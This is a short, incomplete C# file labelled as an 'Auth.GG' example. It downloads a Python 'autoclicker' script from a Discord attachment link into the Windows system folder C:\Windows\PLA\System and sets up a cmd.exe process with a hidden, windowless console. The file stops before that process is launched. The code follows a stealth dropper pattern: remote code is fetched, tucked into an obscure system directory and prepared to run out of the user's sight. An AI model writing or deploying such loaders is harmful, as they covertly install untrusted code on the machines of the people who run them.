using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Threading;


namespace Auth.GG_Example
{
    class Python3
    {

        public static void dl3()
        {
            WebClient Client = new WebClient();
            string text = @"C:\Windows\PLA\System\Hex_autoclicker.py";

            Client.DownloadFile("https://cdn.discordapp.com/attachments/855087379878248479/855532749702823987/Hex_autoclicker.py", text);


            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;













        }
    }

}

